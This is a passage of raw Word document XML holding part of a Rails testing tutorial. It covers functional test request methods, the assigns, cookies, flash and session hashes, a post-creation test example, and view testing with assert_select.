    <w:p w14:paraId="200B4747" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>All of request types are methods that you can use, however, you’ll probably end up using the first two more often than the others.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BBA2736" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Functional tests do not verify whether the specified request type should be accepted by the action. Request types in this context exist to make your tests more descriptive.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7F3A33" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 The Four Hashes of the Apocalypse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EE8B2D6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>After a request has been made by using one of the 5 methods (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>post</w:t>
      </w:r>
      <w:r>
        <w:t>, etc.) and processed, you will have 4 Hash objects ready for use:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30217C55" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="317"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assigns</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Any objects that are stored as instance variables in actions for use in views.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FAB9263" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="317"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>cookies</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Any cookies that are set.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="441B9AB5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="317"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>flash</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Any objects living in the flash.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="720AFB2D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="317"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Any object living in session variables.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A52DCFE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As is the case with normal Hash objects, you can access the values by referencing the keys by string. You can also reference them by symbol name, except for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assigns</w:t>
      </w:r>
      <w:r>
        <w:t>. For example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8040"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6F2D6546" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47F4C8A0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>flash["gordon"]               flash[:gordon]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14C17F7D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>session["shmession"]          session[:shmession]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E449E53" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>cookies["are_good_for_u"]     cookies[:are_good_for_u]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="097AADAC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="426558F4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># Because you can't use assigns[:something] for historical reasons:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45126EB1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assigns["something"]          assigns(:something)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3B931AA0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 Instance Variables Available</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1571510E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You also have access to three instance variables in your functional tests:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="373F5343" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="318"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@controller</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – The controller processing the request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="136A0EA1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="318"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@request</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – The request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66BFEF6F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="318"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@response</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – The response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C5150F6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.5 A Fuller Functional Test Example</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="069BCCD4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Here’s another example that uses </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>flash</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_redirected_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_difference</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517A6C1" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="220DA461" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test "should create post"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0067DC08" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  assert_difference('Post.count') do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B70DAA0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    post :create, :post</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; { :title</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Hi', :body</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'This is my first post.'}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="237FFD0D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="001BA42F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  assert_redirected_to post_path(assigns(:post))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F7644FD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  assert_equal 'Post was successfully created.', flash[:notice]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3741744E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="576532D2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.6 Testing Views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="605B9407" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Testing the response to your request by asserting the presence of key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> elements and their content is a useful way to test the views of your application. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_select</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> assertion allows you to do this by using a simple yet powerful syntax.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="344AC668" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You may find references to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_tag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in other documentation, but this is now deprecated in favor of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_select</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33AA52E8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There are two forms of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_select</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283B60EE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_select(selector, [equality], [message])</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ensures that the equality condition is met on the selected elements through the selector. The selector may be a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>CSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> selector expression (String), an expression with substitution values, or an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>HTML::Selector</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> object.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09024B5A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_select(element, selector, [equality], [message])</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ensures that the equality condition is met on all the selected elements through the selector starting from the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>element</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (instance of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>HTML::Node</w:t>
      </w:r>
      <w:r>
        <w:t>) and its descendants.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38117AB6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>For example, you could verify the contents on the title element in your response with:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6600"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5EC80595" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="119D68BE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="845285326"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assert_select 'title', "Welcome to Rails Testing Guide"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3A8B06B0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can also use nested </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_select</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> blocks. In this case the inner </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_select</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> runs the assertion on the complete collection of elements selected by the outer </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_select</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> block:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3840"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1E1AFD2E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="028C5473" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assert_select 'ul.navigation'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C907054" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  assert_select 'li.menu_item'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C323B55" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0C6F8443" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Alternatively the collection of elements selected by the outer </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_select</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> may be iterated through so that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assert_select</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> may be called separately for each element. Suppose for example that the response contains two ordered lists, each with four list elements then the following tests will both pass.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4560"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2059F026" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2D31BACF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assert_select "ol"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|elements|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67D86114" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  elements.each</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|element|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="731119D9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_select element, "li", 4</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72199503" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A76859B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FF06C58" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15792810" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>assert_select "ol"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6402BB36" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  assert_select "li", 8</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57D4F8CF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
